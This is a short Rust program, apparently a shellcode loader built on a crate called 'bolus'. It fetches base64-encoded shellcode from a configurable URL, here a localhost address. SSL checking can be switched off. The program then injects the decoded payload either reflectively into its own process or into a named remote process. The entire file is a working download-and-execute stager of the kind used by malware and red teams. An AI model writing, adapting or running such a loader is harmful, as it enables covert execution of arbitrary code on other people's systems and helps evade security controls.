
extern crate bolus;

use bolus::{
    inject,
    injectors::{InjectionType, InjectorType},
    load,
};

/// The URL where shellcode will be downloaded from
const URL: &str = "http://localhost:8081/rustic-sc.txt";
/// The # of base64 iterations to decode
const B64_ITERATIONS: usize = 1;
/// If not blank, the process name to inject into
const PROCESS_NAME: &str = "";
/// `WaitForSingleObject` Switch. Usually you want this
const WAIT_FOR_SINGLE_OBJECT: bool = true;
/// `IgnoreSSL` switch. You know what this does.
const IGNORE_SSL: bool = true;

fn main() -> Result<(), String> {
    let injection_type = match PROCESS_NAME {
        "" => InjectionType::Reflect,
        _ => InjectionType::Remote(PROCESS_NAME.to_string()),
    };
    let injector = load(
        InjectorType::Base64Url((
            URL.to_string(),
            IGNORE_SSL,
            B64_ITERATIONS
        ))
    )?;
    inject(
        injector,
        injection_type,
        WAIT_FOR_SINGLE_OBJECT
    )
}